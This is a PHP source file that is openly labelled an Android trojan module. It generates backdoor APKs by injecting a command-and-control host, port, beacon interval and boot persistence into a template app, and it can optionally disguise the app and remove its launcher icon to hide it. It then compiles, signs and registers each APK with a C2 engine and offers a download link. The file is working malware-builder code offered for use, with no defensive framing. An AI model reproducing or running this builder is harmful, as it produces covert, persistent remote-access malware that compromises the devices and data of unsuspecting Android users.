<?php
/**
 * COSMIC ANDROID TROJAN MODULE – ENTERPRISE/INDUSTRIAL‑GRADE v2.4
 * Uses system tools (aapt, dx, apksigner) as fallback if SDK tools are missing.
 * Generates custom Android backdoor APKs with C2 integration.
 */
class AndroidTrojanModule {

    private $config;
    private $logger;
    private $c2Engine;
    private $workDir;
    private $outputDir;

    public function __construct($config = []) {
        $this->config = array_merge([
            'android_sdk'       => getenv('HOME') . '/android-sdk',
            'build_tools'       => '34.0.0',
            'keystore_path'     => dirname(__DIR__, 2) . '/data/keys/android.keystore',
            'keystore_pass'     => 'cosmic',
            'key_alias'         => 'cosmic',
            'key_pass'          => 'cosmic',
            'template_dir'      => dirname(__DIR__, 2) . '/system/templates/android/base_app',
            'disguise_template' => dirname(__DIR__, 2) . '/system/templates/android/base_app_disguise',
            'output_dir'        => dirname(__DIR__, 2) . '/data/payloads/',
            'log_dir'           => dirname(__DIR__, 2) . '/data/logs/',
            'min_sdk'           => 29,
            'target_sdk'        => 33,
        ], $config);

        $this->outputDir = rtrim($this->config['output_dir'], '/') . '/';
        $this->initLogger();
        $this->checkPrerequisites();
        $this->ensureKeystore();

        if (class_exists('C2Engine')) {
            $this->c2Engine = new C2Engine();
        }
    }

    private function initLogger() {
        $logFile = $this->config['log_dir'] . '/android_trojan.log';
        $this->logger = function($level, $message, $context = []) use ($logFile) {
            $entry = sprintf("[%s] %s: %s %s\n",
                date('Y-m-d H:i:s'),
                strtoupper($level),
                $message,
                json_encode($context)
            );
            file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
        };
    }

    private function log($level, $message, $context = []) {
        if ($this->logger) {
            ($this->logger)($level, $message, $context);
        }
    }

    /**
     * Find a tool – try SDK build‑tools first, then system PATH.
     */
    private function findTool($name) {
        // First try SDK build‑tools
        $sdkTool = $this->config['android_sdk'] . '/build-tools/' . $this->config['build_tools'] . '/' . $name;
        if (file_exists($sdkTool)) {
            return $sdkTool;
        }
        // Then try system
        $systemTool = trim(shell_exec("which $name 2>/dev/null"));
        if (!empty($systemTool) && file_exists($systemTool)) {
            return $systemTool;
        }
        // Not found
        return false;
    }

    private function checkPrerequisites() {
        $tools = ['aapt', 'dx', 'apksigner', 'javac'];
        $missing = [];
        foreach ($tools as $tool) {
            if (!$this->findTool($tool)) {
                $missing[] = $tool;
            }
        }
        // Check android.jar
        $androidJar = $this->config['android_sdk'] . '/platforms/android-' . $this->config['target_sdk'] . '/android.jar';
        if (!file_exists($androidJar)) {
            $missing[] = "android.jar for API {$this->config['target_sdk']} (not found at $androidJar)";
        }
        if (!empty($missing)) {
            $this->log('ERROR', 'Missing prerequisites', ['missing' => $missing]);
            throw new RuntimeException("Android SDK prerequisites missing: " . implode(', ', $missing));
        }
        $this->log('INFO', 'Prerequisites satisfied');
    }

    private function ensureKeystore() {
        $ks = $this->config['keystore_path'];
        if (file_exists($ks)) {
            return;
        }
        $dir = dirname($ks);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        $cmd = sprintf(
            'keytool -genkey -v -keystore %s -alias %s -keyalg RSA -keysize 2048 -validity 10000 -storepass %s -keypass %s -dname "CN=COSMIC, OU=LAB, O=OSINT, L=Unknown, ST=Unknown, C=XX"',
            escapeshellarg($ks),
            escapeshellarg($this->config['key_alias']),
            escapeshellarg($this->config['keystore_pass']),
            escapeshellarg($this->config['key_pass'])
        );
        exec($cmd . ' 2>&1', $output, $return);
        if ($return !== 0) {
            $this->log('ERROR', 'Keystore creation failed', ['output' => $output]);
            throw new RuntimeException('Failed to create keystore: ' . implode("\n", $output));
        }
        $this->log('INFO', 'Keystore created', ['path' => $ks]);
    }

    public function generate_payload($cfg) {
        $cfg = array_merge([
            'lhost'           => '127.0.0.1',
            'lport'           => 4444,
            'app_name'        => 'CosmicUpdate',
            'package_name'    => 'com.cosmic.update',
            'persistence'     => 'boot',
            'disguise'        => false,
            'hide_icon'       => false,
            'beacon_interval' => 60,
            'use_encryption'  => false,
        ], $cfg);

        $this->log('INFO', 'Starting APK generation', $cfg);

        $this->workDir = sys_get_temp_dir() . '/cosmic_android_' . uniqid('', true);
        mkdir($this->workDir, 0755, true);

        try {
            $templateDir = $cfg['disguise'] ? $this->config['disguise_template'] : $this->config['template_dir'];
            $this->copyDir($templateDir, $this->workDir);

            $this->injectConfig($cfg);

            if ($cfg['hide_icon']) {
                $this->hideLauncherIcon();
            }

            $this->compileResources();
            $this->compileJava();
            $this->convertToDex();
            $unsignedApk = $this->buildUnsignedApk();
            $signedApk = $this->signApk($unsignedApk);

            $finalFilename = $this->generateFilename($cfg);
            $finalPath = $this->outputDir . $finalFilename;
            copy($signedApk, $finalPath);

            $hashes = [
                'md5'    => md5_file($finalPath),
                'sha1'   => sha1_file($finalPath),
                'sha256' => hash_file('sha256', $finalPath),
            ];

            $c2_uuid = null;
            if ($this->c2Engine) {
                $c2_uuid = $this->c2Engine->registerPayload([
                    'name'     => $cfg['app_name'],
                    'type'     => 'android_custom',
                    'platform' => 'android',
                    'lhost'    => $cfg['lhost'],
                    'lport'    => $cfg['lport'],
                    'filename' => $finalFilename,
                    'hash'     => $hashes['sha256'],
                ]);
            }

            $result = [
                'payload'   => file_get_contents($finalPath),
                'filename'  => $finalFilename,
                'path'      => $finalPath,
                'size'      => filesize($finalPath),
                'hash'      => $hashes,
                'c2_uuid'   => $c2_uuid,
                'download_url' => '/download.php?file=' . urlencode($finalFilename),
            ];

            $this->log('INFO', 'APK generated successfully', ['filename' => $finalFilename]);
            return $result;

        } catch (Exception $e) {
            $this->log('ERROR', 'APK generation failed', ['error' => $e->getMessage()]);
            throw $e;
        } finally {
            $this->delTree($this->workDir);
        }
    }

    private function injectConfig($cfg) {
        $configFile = $this->workDir . '/app/src/main/java/com/cosmic/Config.java';
        $dir = dirname($configFile);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        $encryption = $cfg['use_encryption'] ? 'true' : 'false';
        $persistence = $cfg['persistence'];
        $interval = (int)$cfg['beacon_interval'];

        $content = <<<JAVA
package com.cosmic;

public class Config {
    public static final String C2_HOST = "{$cfg['lhost']}";
    public static final int C2_PORT = {$cfg['lport']};
    public static final int BEACON_INTERVAL = $interval;
    public static final boolean ENCRYPTION_ENABLED = $encryption;
    public static final String PERSISTENCE_TYPE = "$persistence";
}
JAVA;
        file_put_contents($configFile, $content);
        $this->log('DEBUG', 'Config injected', ['file' => $configFile]);
    }

    private function hideLauncherIcon() {
        $manifest = $this->workDir . '/AndroidManifest.xml';
        $content = file_get_contents($manifest);
        $content = preg_replace('/<category android:name="android.intent.category.LAUNCHER"\/>/', '', $content);
        file_put_contents($manifest, $content);
        $this->log('DEBUG', 'Launcher icon hidden');
    }

    private function compileResources() {
        $aapt = $this->findTool('aapt');
        if (!$aapt) {
            throw new RuntimeException('aapt not found');
        }
        $manifest = $this->workDir . '/AndroidManifest.xml';
        $resDir = $this->workDir . '/res';
        $genDir = $this->workDir . '/gen';
        if (!is_dir($genDir)) mkdir($genDir, 0755, true);
        $androidJar = $this->config['android_sdk'] . '/platforms/android-' . $this->config['target_sdk'] . '/android.jar';

        $cmd = sprintf(
            '%s package -f -m -J %s -M %s -S %s -I %s',
            escapeshellarg($aapt),
            escapeshellarg($genDir),
            escapeshellarg($manifest),
            escapeshellarg($resDir),
            escapeshellarg($androidJar)
        );
        $this->execCmd($cmd, 'aapt compilation failed');
    }

    private function compileJava() {
        $javac = $this->findTool('javac');
        if (!$javac) {
            throw new RuntimeException('javac not found');
        }
        $srcDir = $this->workDir . '/app/src/main/java';
        $genDir = $this->workDir . '/gen';
        $classDir = $this->workDir . '/build/classes';
        if (!is_dir($classDir)) mkdir($classDir, 0755, true);
        $androidJar = $this->config['android_sdk'] . '/platforms/android-' . $this->config['target_sdk'] . '/android.jar';

        $javaFiles = [];
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($srcDir));
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'java') {
                $javaFiles[] = $file->getPathname();
            }
        }
        if (is_dir($genDir)) {
            $iterator2 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($genDir));
            foreach ($iterator2 as $file) {
                if ($file->isFile() && $file->getExtension() === 'java') {
                    $javaFiles[] = $file->getPathname();
                }
            }
        }

        if (empty($javaFiles)) {
            throw new RuntimeException('No Java source files found');
        }

        $classpath = $androidJar . ':' . $genDir;

        $cmd = sprintf(
            '%s -source 1.8 -target 1.8 -d %s -bootclasspath %s -cp %s %s',
            escapeshellarg($javac),
            escapeshellarg($classDir),
            escapeshellarg($androidJar),
            escapeshellarg($classpath),
            implode(' ', array_map('escapeshellarg', $javaFiles))
        );
        $this->execCmd($cmd, 'javac compilation failed');
    }

    private function convertToDex() {
        $tool = $this->findTool('dx');
        if (!$tool) {
            // Try d8 as fallback
            $tool = $this->findTool('d8');
            if (!$tool) {
                throw new RuntimeException('Neither dx nor d8 found');
            }
            $toolName = 'd8';
        } else {
            $toolName = 'dx';
        }

        $classDir = $this->workDir . '/build/classes';
        $dexDir = $this->workDir . '/build/dex';
        if (!is_dir($dexDir)) mkdir($dexDir, 0755, true);

        if ($toolName === 'dx') {
            $cmd = sprintf(
                '%s --dex --output=%s %s',
                escapeshellarg($tool),
                escapeshellarg($dexDir),
                escapeshellarg($classDir)
            );
        } else { // d8
            $androidJar = $this->config['android_sdk'] . '/platforms/android-' . $this->config['target_sdk'] . '/android.jar';
            $cmd = sprintf(
                '%s --lib %s --output %s %s',
                escapeshellarg($tool),
                escapeshellarg($androidJar),
                escapeshellarg($dexDir),
                escapeshellarg($classDir)
            );
        }
        $this->execCmd($cmd, $toolName . ' conversion failed');
    }

    private function buildUnsignedApk() {
        $aapt = $this->findTool('aapt');
        if (!$aapt) {
            throw new RuntimeException('aapt not found');
        }
        $manifest = $this->workDir . '/AndroidManifest.xml';
        $resDir = $this->workDir . '/res';
        $androidJar = $this->config['android_sdk'] . '/platforms/android-' . $this->config['target_sdk'] . '/android.jar';
        $unsignedApk = $this->workDir . '/build/app-unsigned.apk';

        $cmd = sprintf(
            '%s package -f -M %s -S %s -I %s -F %s',
            escapeshellarg($aapt),
            escapeshellarg($manifest),
            escapeshellarg($resDir),
            escapeshellarg($androidJar),
            escapeshellarg($unsignedApk)
        );
        $this->execCmd($cmd, 'aapt packaging failed');

        $dexFiles = glob($this->workDir . '/build/dex/*.dex');
        if (empty($dexFiles)) {
            throw new RuntimeException('No dex files generated');
        }
        foreach ($dexFiles as $dex) {
            $cmd = sprintf('zip -j %s %s', escapeshellarg($unsignedApk), escapeshellarg($dex));
            $this->execCmd($cmd, 'adding dex to APK failed');
        }

        return $unsignedApk;
    }

    private function signApk($unsignedApk) {
        $apksigner = $this->findTool('apksigner');
        if (!$apksigner) {
            throw new RuntimeException('apksigner not found');
        }
        $signedApk = $unsignedApk . '-signed.apk';

        $cmd = sprintf(
            '%s sign --ks %s --ks-pass pass:%s --key-pass pass:%s --ks-key-alias %s --out %s %s',
            escapeshellarg($apksigner),
            escapeshellarg($this->config['keystore_path']),
            escapeshellarg($this->config['keystore_pass']),
            escapeshellarg($this->config['key_pass']),
            escapeshellarg($this->config['key_alias']),
            escapeshellarg($signedApk),
            escapeshellarg($unsignedApk)
        );
        $this->execCmd($cmd, 'apksigner signing failed');
        return $signedApk;
    }

    private function generateFilename($cfg) {
        $ts = date('Ymd_His');
        $rand = substr(bin2hex(random_bytes(4)), 0, 8);
        $name = preg_replace('/[^a-z0-9]/i', '_', $cfg['app_name']);
        return "cosmic_android_{$name}_{$ts}_{$rand}.apk";
    }

    private function execCmd($cmd, $errorMessage) {
        $this->log('DEBUG', 'Executing command', ['cmd' => $cmd]);
        exec($cmd . ' 2>&1', $output, $return);
        if ($return !== 0) {
            $this->log('ERROR', $errorMessage, ['output' => $output]);
            throw new RuntimeException($errorMessage . "\n" . implode("\n", $output));
        }
        return true;
    }

    private function copyDir($src, $dst) {
        $dir = opendir($src);
        if (!is_dir($dst)) {
            mkdir($dst, 0755, true);
        }
        while (($file = readdir($dir)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $srcFile = $src . '/' . $file;
            $dstFile = $dst . '/' . $file;
            if (is_dir($srcFile)) {
                $this->copyDir($srcFile, $dstFile);
            } else {
                copy($srcFile, $dstFile);
            }
        }
        closedir($dir);
    }

    private function delTree($dir) {
        if (!is_dir($dir)) return;
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->delTree($path) : unlink($path);
        }
        rmdir($dir);
    }
}
